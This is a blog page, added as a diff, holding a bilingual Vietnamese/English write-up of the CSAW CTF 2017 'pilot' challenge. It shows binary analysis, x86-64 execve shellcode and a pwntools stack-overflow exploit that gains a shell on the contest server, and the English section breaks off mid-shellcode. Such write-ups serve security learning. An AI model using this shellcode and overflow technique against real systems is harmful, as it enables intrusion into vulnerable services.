@@ -1,0 +1,861 @@
+
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+   
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="google-site-verification" content="YvLRi76QLISdw5rag4dXqmRRYvw91no7guPZf0-a6FY" />
+    <meta property="og:title" content=" CSAW CTF 2017 Qualification &middot;  Protego Totalum Security" />
+    <meta property="og:site_name" content="Protego Totalum Security" />
+    <meta property="og:url" content="https://protegototalum.faith/post/csaw-ctf-17-qual/" />
+
+    
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content="2017-09-20T23:48:01-04:00" />
+    <meta property="og:article:tag" content="CSAW CTF 17" />
+    <meta property="og:article:tag" content="CTF" />
+    <meta property="og:article:tag" content="reversing" />
+    <meta property="og:article:tag" content="pwn" />
+    
+
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@flyingpassword" />
+    <meta name="twitter:creator" content="@flyingpassword" />
+    <meta name="twitter:title" content="CSAW CTF 2017 Qualification" />
+    
+    <meta name="twitter:description" content="pwn: pilot (75 pts.) English version here
+Vietnamese Năm nay mình có cơ hội chơi CSAW CTF một cách thực sự, với hy vọng team đủ khỏe để vào final North America lần nữa. Qua một năm được các tiền bối thông não (quangltm và anh tuanit96), mình đã quẩy được vài bài khá cơ bản.
+Đây là bài đầu tiên mình owned trong giờ thi. Bài này là một bài buffer overflow cơ bản." />
+    <meta name="twitter:url" content="https://protegototalum.faith/post/csaw-ctf-17-qual/" />
+    
+
+    <title> CSAW CTF 2017 Qualification &middot;  Protego Totalum Security</title>
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <link rel="preload" href="/js/main.js" as="script" />
+    <link rel="preload" href="/css/main.css" as="style" />
+    
+    
+
+
+    
+    <meta name="description" content="Dig deeper. Try harder. Repeat" />
+    
+
+    
+    <meta name="p:domain_verify" content=""/>
+    
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    
+    
+
+    
+    <link href="https://protegototalum.faith/index.xml" rel="alternate" type="application/rss+xml" title="Protego Totalum Security" />
+    
+
+    
+    <link rel="canonical" href="https://protegototalum.faith/post/csaw-ctf-17-qual/" />
+
+    
+    <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://protegototalum.faith/post/csaw-ctf-17-qual/"
+        },
+        "headline": "CSAW CTF 2017 Qualification",
+        "description": "",
+        "author": {
+            "@type": "Person",
+            "name": "Duc Phan",
+            "url": "http://profiles.google.com/?rel=author",
+            "image": {
+              "@type": "ImageObject",
+              "url": "https:",
+              "height": 80,
+              "width": 80
+            }
+        },
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://protegototalum.faith/",
+          "name": "Protego Totalum Security",
+          "url": "https://protegototalum.faith/",
+          "logo": {
+            "@type": "ImageObject",
+            "url": "https:",
+            "height": 80,
+            "width": 80
+          }
+        },
+        
+        "image": {
+          "@type": "ImageObject",
+          "url": "",
+          "height": 80,
+          "width": 80
+        },
+        "datePublished": "2017-09-20",
+        "dateModified": "2017-09-20",
+        "wordCount": 2914,
+        "keywords": ["CSAW CTF 17","CTF","reversing","pwn"] 
+    }
+    </script>
+    
+
+    
+    <script type="text/javascript">
+        
+        
+        var disqus_shortname = 'asimpleguy';
+        var disqus_identifier = 'https:\/\/protegototalum.faith\/post\/csaw-ctf-17-qual\/';
+        var disqus_title = 'CSAW CTF 2017 Qualification';
+        var disqus_url = 'https:\/\/protegototalum.faith\/post\/csaw-ctf-17-qual\/';
+        
+    </script>
+    
+
+    <script type="text/javascript">
+        var config = {
+            baseUrl: "https:\/\/protegototalum.faith\/"
+        };
+    </script>
+
+    <style>
+html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,figure,footer,header,main,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figure{margin:1em 40px}a{background-color:transparent;-webkit-text-decoration-skip:objects}img{border-style:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:300;src:local("Merriweather Sans Light"),local(MerriweatherSans-Light),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowY_zIojJi0m4a5Z6tRh6itY.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:400;src:local("Merriweather Sans Regular"),local(MerriweatherSans-Regular),url(//fonts.gstatic.com/s/merriweathersans/v5/AKu1CjQ4qnV8MUltkAX3sL2aU247V0zTzydO4RoO9Ok.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:700;src:local("Merriweather Sans Bold"),local(MerriweatherSans-Bold),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowQfd-b-I5PxxcmB4_-MNcqw.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:800;src:local("Merriweather Sans ExtraBold"),local(MerriweatherSans-ExtraBold),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowWT7sFQ1Iz1BbpcuCPlgc9Q.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:300;src:local("Merriweather Sans Light Italic"),local(MerriweatherSans-LightItalic),url(//fonts.gstatic.com/s/merriweathersans/v5/nAqt4hiqwq3tzCecpgPmVX9UU5BmOJGkLxUCVv5VXdc.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:400;src:local("Merriweather Sans Italic"),local(MerriweatherSans-Italic),url(//fonts.gstatic.com/s/merriweathersans/v5/3Mz4hOHzs2npRMG3B1ascf0KIgDhPIHb_R-SWdtqte8.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:700;src:local("Merriweather Sans Bold Italic"),local(MerriweatherSans-BoldItalic),url(//fonts.gstatic.com/s/merriweathersans/v5/nAqt4hiqwq3tzCecpgPmVYM8pfYvjMoOxygpzLVILAs.woff) format("woff")}@font-face {font-family: 'Aldrich';font-style: normal;font-weight: 400;src: local('Aldrich Regular'), local('Aldrich-Regular'), url('//fonts.gstatic.com/s/aldrich/v8/j-NnyokbAnhXANS2iZ6Jew.woff2') format('woff2');unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;font-style:normal}[class^="icon-"]:before{font-family:"icons";font-style:normal;font-weight:400;speak:none;display:inline-block;text-decoration:inherit;width:1em;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.icon-arrow-right:before{content:'\e807'}.icon-rss:before{content:'\e808'}body{font:300 1em / 1.5em 'Merriweather Sans',sans-serif;color:#595B66}a{color:inherit;text-decoration:none;font-weight:400}h1,h2{text-rendering:optimizeLegibility;color:#1F2026}h2 a{font-weight:inherit}h1{font-size:2em;line-height:1em;margin:2em 0 -.5em}h2{font-size:1.75em;line-height:1.143em;margin:2.286em 0 -.571em}p{margin:2em auto}i{font-weight:400;font-style:italic;color:#363740}img{display:block;max-width:100%;height:auto;margin:2.5em auto}body{background:#fff}.inner{max-width:48em;margin:0 auto;padding:0 1em}#wrapper{position:relative;box-sizing:border-box;width:100%;min-height:100vh;padding-bottom:6em;background:#F2F3F5}#push{transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#nav{position:relative;background:#fff;z-index:70;transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#nav:after{clear:both;content:'';display:table}#nav .nav-logo{float:left;height:2em;padding:1em;max-width:50%}#nav .nav-logo img{width:auto;max-width:none;height:2em;margin:0;border-radius:5px}#nav .nav-menu{float:right}#nav .nav-menu:after{clear:both;content:'';display:table}#nav .nav-menu a{display:block;width:1em;height:1em;line-height:1em;padding:1.5em;text-align:center;float:left}#nav .nav-menu a i:before{margin:auto}.overlay{display:none;position:fixed;left:0;top:0;width:100%;height:100%;z-index:80;display:none}.overlay:before{content:'';position:absolute;left:0;top:0;width:100%;height:100%;background:#1F2026;opacity:0;transform-style:preserve-3d}#header{position:relative;padding:4em 0}#header .inner{position:relative;z-index:2}#header .header-title{display:block;text-align:center}#header .header-name{font-family: Aldrich, sans-serif;font-weight:700;letter-spacing:-1px;display:block;line-height:1em;font-size:2em;text-decoration:none;color:#1F2026;padding:0;margin:0}#header.has-cover .header-name{color:#fff}#header .header-description{display:block;margin:1em auto 0;color:#9D9FA6;position:relative;font-weight:300}#header .header-description:after{content:'';position:absolute;height:1px;width:100px;margin-left:-50px;left:50%;top:-.5em;background:#D4D5D9}#header.has-cover .header-description{color:#fff}#header.has-cover .header-description:after{background:#fff}#header .header-cover{position:absolute;width:100%;height:100%;top:0;left:0;margin-top:-4em;padding:4em 0;background:no-repeat fixed center 100% / cover;z-index:1}#header .header-cover:before{content:'';position:absolute;width:100%;height:100%;left:0;top:0;background:rgba(0,0,0,0.2)}#header .header-cover:after{content:'';position:absolute;width:100%;left:0;bottom:0;border-bottom:4px solid #19A0D7}#footer{position:absolute;width:100%;left:0;bottom:0;font-size:.75em;line-height:1.334em;background:#1F2026;color:#737580;z-index:20;transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#footer a{color:#9D9FA6;font-weight:400}#footer .credits{text-align:center;font-size:.75em;line-height:1.334em;padding:2.667em;overflow:auto}#footer .credits span{display:block}#footer .credits .credits-theme{float:left}#footer .credits .credits-software{float:right}.post{position:relative;z-index:20}.post .post-image{display:block;margin:0;padding:0}.post .post-image img{display:block;width:100%;height:auto;margin:0;padding:0}.post .post-meta{display:block;font-size:.75em;line-height:1.334em;font-weight:400;margin-bottom:1.334em}.post .post-title{position:relative;color:#000;font-size:2em;line-height:1.375em;font-weight:800;text-indent:-1px;margin:.25em 0 .75em}.post .post-title:before{content:'';position:absolute;left:0;bottom:-.334em;width:1em;margin-bottom:-2px;border-bottom:4px solid #19A0D7}.post .post-title a{text-decoration:none;color:inherit;font-weight:inherit}#post-index{position:relative;max-width:1200px;margin:0 auto 4em;padding:.5em;z-index:10}@keyframes fade{0%{transform:translate3d(0,3em,0);opacity:0}100%{transform:translate3d(0,0,0);opacity:1}}.post-list{position:relative}.post-list .post{float:left;width:33.3%;transform:translate3d(0,3em,0);transform-style:preserve-3d;opacity:0;animation:fade ease-out .5s forwards;animation-delay:1.4s}@media only screen and (max-width: 50em){.post-list .post{width:49.9%}}@media only screen and (max-width: 30em){.post-list .post{width:100%;float:none}}.post-list .post:nth-child(1){animation-delay:.1s}.post-list .post:nth-child(2){animation-delay:.2s}.post-list .post:nth-child(3){animation-delay:.3s}.post-list .post:nth-child(4){animation-delay:.4s}.post-list .post:nth-child(5){animation-delay:.5s}.post-list .post:nth-child(6){animation-delay:.6s}.post-list .post:nth-child(7){animation-delay:.7s}.post-list .post:nth-child(8){animation-delay:.8s}.post-list .post:nth-child(9){animation-delay:.9s}.post-list .post .inner{word-wrap:break-word;padding:2em;margin:.5em;max-width:none;background:#fff;box-sizing:border-box;transform:scale(1);transform-style:preserve-3d}@media only screen and (max-width: 50em){.post-list .post .inner{padding:1em}}.post-list .post .post-link{position:absolute;left:0;top:0;width:100%;height:100%;z-index:10}.post-list .post .post-image{position:relative;margin:-2em -2em 0;overflow:hidden;background:#19A0D7}@media only screen and (max-width: 50em){.post-list .post .post-image{margin:-1em -1em 0}}.post-list .post .post-image img{transform:scale(1);transform-style:preserve-3d;opacity:1}.post-list .post .post-image:after{content:'';position:absolute;left:-5%;bottom:-2.5em;width:110%;height:4em;background:#fff;border-top:4px solid #19A0D7;box-shadow:0 0 2em rgba(0,0,0,0.2);transform:rotate(5deg)}.post-list .post .post-title{font-size:1.5em;line-height:1.167em}.post-list .post .post-excerpt{margin:0}.post-list .post .post-more{display:block;margin-top:1.5em}.post-list .post .post-more a{display:inline-block;font-size:.875em;line-height:1.143em;font-weight:400;color:#363740}.post-list .post .post-more a i{color:#0e77a0}.pagination{min-height:3em;margin:4em auto 2em;padding:0;position:relative}.pagination .pagination-item{position:relative;display:block;height:3em;line-height:3em;padding:0 1em;text-align:center;text-decoration:none;font-weight:700;color:#363740;border:1px solid #19A0D7;border-radius:4em;z-index:60}.pagination .pagination-item i{position:relative}@media only screen and (max-width: 30em){.pagination .pagination-item{width:4em;height:4em;line-height:4em;margin-top:-.5em;padding:0!important}.pagination .pagination-item i{font-size:1.5em}.pagination .pagination-item>span{display:none}}.pagination .pagination-prev{float:right}.pagination .pagination-prev i{right:-.05em}.pagination .pagination-info{display:block;left:0;top:0;height:3em;line-height:3em;position:absolute;text-align:center;width:100%;z-index:50;color:#9D9FA6}#loader-wrapper{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000}#loader{display:block;position:relative;left:50%;top:50%;width:150px;height:150px;margin:-75px 0 0 -75px;border-radius:50%;border:3px solid transparent;border-top-color:#19A0D7;animation:spin 2s linear infinite}#loader:before{content:"";position:absolute;top:5px;left:5px;right:5px;bottom:5px;border-radius:50%;border:3px solid transparent;border-top-color:#0e77a0;animation:spin 3s linear infinite}#loader:after{content:"";position:absolute;top:15px;left:15px;right:15px;bottom:15px;border-radius:50%;border:3px solid transparent;border-top-color:#D4D5D9;animation:spin 1.5s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+</style>
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-119018152-2"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-119018152-2');
+    </script>
+
+</head>
+
+
+<body class="home-template">
+<div id="loader-wrapper">
+    <div id="loader"></div>
+</div>
+<section id="wrapper" style="display: none;">
+    <div id="ajax-container">
+        <nav id="nav" class="nav">
+            <div class="nav-logo">
+                <a href="https://protegototalum.faith/">
+                    
+                    Protego Totalum Security
+                    
+                </a>
+            </div>
+            <div id="main-menu" class="nav-menu">
+                
+                
+                    <a class="nav-social" target="_blank" href="https://twitter.com/flyingpassword" title="Protego Totalum Security on Twitter"><i class="fa fa-twitter"></i></a>
+                
+                
+                    <a class="nav-social" target="_blank" href="https://linkedin.com/in/ducphanduy" title="Protego Totalum Security on LinkedIn"><i class="fa fa-linkedin"></i></a>
+                
+                
+                <a class="nav-social" target="_blank" href="https://github.com/ducphanduyagentp" title="Protego Totalum Security on GitHub"><i class="fa fa-github"></i></a>
+                
+                <a id="search-button" onclick="$('#search-form').toggle();" title="Search"><i class="fa fa-search"></i></a>
+                <form id="search-form" method="get" role="search" action="https://google.com/search">
+                    <input type="hidden" name="as_sitesearch" value="https://protegototalum.faith/">
+                    <input type="text" name="q" maxlength="255" placeholder="Search..." class="form-control">
+                    <input type="submit" value="Search">
+                </form>
+                
+                
+                
+                
+                <a id="main-menu-button" class="menu" data-action="menu" data-target="menu"
+                   title="Main Menu"><i class="fa fa-navicon"></i></a>
+                
+            </div>
+        </nav>
+
+
+<main class="content" role="main">
+    <article class="post">
+        <div class="inner">
+
+            <div id="push">
+
+                <header class="post-header">
+                
+                    <span class="post-meta">
+                        <span class="post-date">20 Sep 2017</span> <span class="reading-time">| <span class="estimated-reading-time">14 min.</span> (<span class="word-count">2914</span> words)</span></span>
+                    </span>
+                <div class="clear"></div>
+                
+                <h1 class="post-title">CSAW CTF 2017 Qualification</h1>
+              </header>
+
+              <section class="post-content">
+                
+                  
+
+<p><img src="/img/csaw-ctf-qualification-2017/scoreboard.png" alt="header" /></p>
+
+<h1 id="pwn-pilot-75-pts">pwn: pilot (75 pts.)</h1>
+
+<p><a href="#english-pilot">English version here</a></p>
+
+<h5 id="vietnamese">Vietnamese</h5>
+
+<p>Năm nay mình có cơ hội chơi CSAW CTF một cách thực sự, với hy vọng team đủ khỏe để vào final North America lần nữa. Qua một năm được các tiền bối thông não (<a href="https://pwneris.me">quangltm</a> và anh <a href="http://www.hardtobelieve.me/">tuanit96</a>), mình đã quẩy được vài bài khá cơ bản.</p>
+
+<p>Đây là bài đầu tiên mình owned trong giờ thi. Bài này là một bài buffer overflow cơ bản. Đầu tiên mình xem thông tin file này:</p>
+
+<pre><code>➜  file pilot
+pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
+</code></pre>
+
+<p>Như vậy đây là file ELF 64-bit đã bị stripped. Debug không thôi thì sẽ rất thốn, nhưng lát nữa mình sẽ giới thiệu 1 tool cực hay mà mình tìm thấy để giúp việc debug stripped binaries đỡ thốn hơn 10000 lần.</p>
+
+<p>Tiếp theo chạy checksec kiểm tra thì thấy binary tắt gần hết bảo vệ, còn mỗi Partial RELRO</p>
+
+<pre><code class="language-r">➜  checksec pilot 
+[*] '/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+
+<p>Chạy chương trình ra output như sau:</p>
+
+<pre><code class="language-r">➜  ./pilot
+[*]Welcome DropShip Pilot...
+[*]I am your assitant A.I....
+[*]I will be guiding you through the tutorial....
+[*]As a first step, lets learn how to land at the designated location....
+[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &amp; Medics...
+[*]Good Luck Pilot!....
+[*]Location:0x7fff0ef02250
+[*]Command:
+</code></pre>
+
+<p>Rất có thể địa chỉ in ra kia là địa chỉ của input buffer. Nhưng chưa vội, mở binary lên bằng radare2 và xem các hàm nào&hellip;</p>
+
+<pre><code class="language-r">➜  r2 -A pilot                           
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
+[0x004008b0]&gt; afl
+0x004007c8    3 26           sub.__gmon_start___248_7c8
+0x00400800    2 16   -&gt; 32   sym.imp.setvbuf
+0x00400810    2 16   -&gt; 48   sub._ZNSt8ios_base4InitC1Ev_32_810
+0x00400820    2 16   -&gt; 48   sym.imp.read
+0x00400830    2 16   -&gt; 48   sym.imp.__libc_start_main
+0x00400840    2 16   -&gt; 48   sym.imp.__cxa_atexit
+0x00400850    2 16   -&gt; 48   sub._ZNSt8ios_base4InitD1Ev_64_850
+0x00400860    2 16   -&gt; 48   sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_860
+0x00400870    2 16   -&gt; 48   sub._ZNSolsEPKv_80_870
+0x00400880    2 16   -&gt; 48   sub._ZNSolsEPFRSoS_E_88_880
+0x00400890    2 16   -&gt; 48   sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_890
+0x004008a0    1 16           sub.__gmon_start___248_8a0
+0x004008b0    1 41           entry0
+0x004008e0    4 50   -&gt; 41   fcn.004008e0
+0x004009a6    4 400          main
+0x00400b36    4 62           sub.std::ios_base::Init.Init___b36
+[0x004008b0]&gt; 
+</code></pre>
+
+<p>Nhìn có vẻ rất ghê vì binary đã bị stripped. Trong một nỗ lực giảm bớt độ khó của việc debug, mình tìm thấy tool này: <a href="https://github.com/danigargu/syms2elf">syms2elf</a>. Tool này có thể dùng với radare2 hoặc IDA, có chức năng thêm lại symbol table vào binary đã bị stripped, giúp cho việc debug trong gdb đỡ thốn gấp vạn lần. Sau khi rename vài hàm quan trọng như main, mình export binary ra bằng dòng lệnh <code>$syms2elf pilot_unstripped</code>. Giờ thì mình đã có thể mở binary lên và debug như binary chưa bị stripped một cách thoải mái.</p>
+
+<p>Đặt breakpoint tại vị trí gọi hàm read trong main ở <code>0x00400ae0</code>:</p>
+
+<pre><code class="language-r">pwndbg&gt; r
+Starting program: /root/workspace/ctfs/2017/csaw/pwn/pilot/pilot_unstripped 
+[*]Welcome DropShip Pilot...
+[*]I am your assitant A.I....
+[*]I will be guiding you through the tutorial....
+[*]As a first step, lets learn how to land at the designated location....
+[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &amp; Medics...
+[*]Good Luck Pilot!....
+[*]Location:0x7fffffffe0a0
+[*]Command:
+Breakpoint 1, 0x0000000000400ae0 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[──────────────────────────────────────────────────────────────────REGISTERS───────────────────────────────────────────────────────────────────]
+*RAX  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
+ RBX  0x0
+*RCX  0x7f1788dd3720 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x40
+ RDI  0x0
+*RSI  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
+*R8   0x7f1789091700 (proc_file_chain_lock) ◂— 0
+*R9   0x7f1789090600 (_IO_2_1_stdout_) ◂— xchg   dword ptr [rax], ebp /* 0xfbad2887 */
+*R10  0x60d
+*R11  0x246
+*R12  0x4008b0 (entry0) ◂— xor    ebp, ebp
+*R13  0x7fffffffe1a0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x7fffffffe0c0 —▸ 0x400b90 ◂— push   r15
+*RSP  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
+*RIP  0x400ae0 (main+314) ◂— call   0x400820
+[────────────────────────────────────────────────────────────────────DISASM────────────────────────────────────────────────────────────────────]
+ ► 0x400ae0 &lt;main+314&gt;    call   read@plt                      &lt;0x400820&gt;
+        fd: 0x0
+        buf: 0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
+        nbytes: 0x40
+</code></pre>
+
+<p>Như vậy ta thấy ngay địa chỉ của buffer khi đọc vào đã được in ra. Vậy thì exploit quá đơn giản rồi, chỉ cần đặt shellcode lên buffẻr và ghi đè return address bằng địa chỉ buffer thôi. Shellcode của mình có chỉnh sửa một chút ở instruction đầu tiên để nới rộng stack dành cho shellcode.</p>
+
+<pre><code class="language-r">   0:   48 83 ec 48             sub    rsp,0x48
+   4:   48 31 d2                xor    rdx,rdx
+   7:   48 bb ff 2f 62 69 6e    movabs rbx,0x68732f6e69622fff
+   e:   2f 73 68 
+  11:   48 c1 eb 08             shr    rbx,0x8
+  15:   53                      push   rbx
+  16:   48 89 e7                mov    rdi,rsp
+  19:   48 31 c0                xor    rax,rax
+  1c:   50                      push   rax
+  1d:   57                      push   rdi
+  1e:   48 89 e6                mov    rsi,rsp
+  21:   b0 3b                   mov    al,0x3b
+  23:   0f 05                   syscall
+</code></pre>
+
+<pre><code class="language-python">from pwn import *
+
+context.arch = 'amd64'
+
+s = remote('pwn.chal.csaw.io', 8464)
+
+raw_input('Exploit?')
+shellcode = &quot;\x48\x83\xEC\x48\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05&quot;
+
+s.recvuntil('[*]Location:')
+leak_buffer = s.recvuntil('\n').strip()
+print leak_buffer
+leak_buffer = int(leak_buffer, 16)
+s.recvuntil('[*]Command:')
+
+print 'Shellcode is at:', hex(leak_buffer)
+
+payload = ''
+payload += shellcode
+payload += '\x90' * (40 - len(shellcode))
+payload += p64(leak_buffer)
+s.sendline(payload)
+s.interactive()
+s.close()
+</code></pre>
+
+<pre><code class="language-r">➜  python exploit.py 
+[+] Opening connection to pwn.chal.csaw.io on port 8464: Done
+Exploit?
+0x7ffe3cf25d80
+Shellcode is at: 0x7ffe3cf25d80
+[*] Switching to interactive mode
+$ id
+uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
+$ whoami
+pilot
+$ cat flag
+flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
+$  
+</code></pre>
+
+<p><a name="english-pilot"></a></p>
+
+<h5 id="english">English</h5>
+
+<p>This is a basic stack overflow challenge. Let&rsquo;s check out the file info.</p>
+
+<pre><code class="language-r">➜  file pilot
+pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
+</code></pre>
+
+<p>The information shows that this is a stripped 64-bit binary. A stripped binary is harder to debug. Fortunately, there is a tool that makes debugging stripped binaries slightly easier.</p>
+
+<p>Let&rsquo;s check security settings on this binary using checksec.</p>
+
+<pre><code class="language-r">➜  checksec pilot 
+[*] '/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+
+<p>Almost no protection! Let&rsquo;s run the binary.</p>
+
+<pre><code class="language-r">➜  ./pilot
+[*]Welcome DropShip Pilot...
+[*]I am your assitant A.I....
+[*]I will be guiding you through the tutorial....
+[*]As a first step, lets learn how to land at the designated location....
+[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &amp; Medics...
+[*]Good Luck Pilot!....
+[*]Location:0x7fff0ef02250
+[*]Command:
+</code></pre>
+
+<p>The location in the output seems a lot like an address in the program, probably the address of the buffer. Let&rsquo;s open it in radare2 to double check.</p>
+
+<pre><code class="language-r">➜  r2 -A pilot                           
+[0x004008b0]&gt; afl
+0x004007c8    3 26           sub.__gmon_start___248_7c8
+0x00400800    2 16   -&gt; 32   sym.imp.setvbuf
+0x00400810    2 16   -&gt; 48   sub._ZNSt8ios_base4InitC1Ev_32_810
+0x00400820    2 16   -&gt; 48   sym.imp.read
+0x00400830    2 16   -&gt; 48   sym.imp.__libc_start_main
+0x00400840    2 16   -&gt; 48   sym.imp.__cxa_atexit
+0x00400850    2 16   -&gt; 48   sub._ZNSt8ios_base4InitD1Ev_64_850
+0x00400860    2 16   -&gt; 48   sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_860
+0x00400870    2 16   -&gt; 48   sub._ZNSolsEPKv_80_870
+0x00400880    2 16   -&gt; 48   sub._ZNSolsEPFRSoS_E_88_880
+0x00400890    2 16   -&gt; 48   sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_890
+0x004008a0    1 16           sub.__gmon_start___248_8a0
+0x004008b0    1 41           entry0
+0x004008e0    4 50   -&gt; 41   fcn.004008e0
+0x004009a6    4 400          main
+0x00400b36    4 62           sub.std::ios_base::Init.Init___b36
+[0x004008b0]&gt; 
+</code></pre>
+
+<p>This looks quite intimidating as the binary was stripped. <a href="https://github.com/danigargu/syms2elf">syms2elf</a> is a tool that can be used in both radare2 and IDA to add symbols back to the symbol table of the stripped binary. Without the symbols, it is harder to navigate while debugging in gdb. This makes debugging way more comfortable.
+You can rename functions before adding symbols back to the binary. To export the modified binary with symbols added: <code>$syms2elf pilot_unstripped</code>.</p>
+
+<p>Set a breakpoint at the call to <code>read@plt</code> in the main function to see where the input is written:</p>
+
+<pre><code class="language-r">pwndbg&gt; r
+Starting program: /root/workspace/ctfs/2017/csaw/pwn/pilot/pilot_unstripped 
+[*]Welcome DropShip Pilot...
+[*]I am your assitant A.I....
+[*]I will be guiding you through the tutorial....
+[*]As a first step, lets learn how to land at the designated location....
+[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &amp; Medics...
+[*]Good Luck Pilot!....
+[*]Location:0x7fffffffe0a0
+[*]Command:
+Breakpoint 1, 0x0000000000400ae0 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[──────────────────────────────────────────────────────────────────REGISTERS───────────────────────────────────────────────────────────────────]
+*RAX  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
+ RBX  0x0
+*RCX  0x7f1788dd3720 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x40
+ RDI  0x0
+*RSI  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
+*R8   0x7f1789091700 (proc_file_chain_lock) ◂— 0
+*R9   0x7f1789090600 (_IO_2_1_stdout_) ◂— xchg   dword ptr [rax], ebp /* 0xfbad2887 */
+*R10  0x60d
+*R11  0x246
+*R12  0x4008b0 (entry0) ◂— xor    ebp, ebp
+*R13  0x7fffffffe1a0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x7fffffffe0c0 —▸ 0x400b90 ◂— push   r15
+*RSP  0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
+*RIP  0x400ae0 (main+314) ◂— call   0x400820
+[────────────────────────────────────────────────────────────────────DISASM────────────────────────────────────────────────────────────────────]
+ ► 0x400ae0 &lt;main+314&gt;    call   read@plt                      &lt;0x400820&gt;
+        fd: 0x0
+        buf: 0x7fffffffe0a0 —▸ 0x400b90 ◂— push   r15
+        nbytes: 0x40
+</code></pre>
+
+<p>As you can see, the address of the input buffer is identical to the address printed in the output of the binary. Since the stack is executable, we only need to put shellcode onto the buffer and overwrite the return address with the address of the input buffer. I slightly modified the shellcode to extend the stack for the actual execution of the shellcode.</p>
+
+<pre><code class="language-r">   0:   48 83 ec 48             sub    rsp,0x48
+   4:   48 31 d2                xor    rdx,rdx
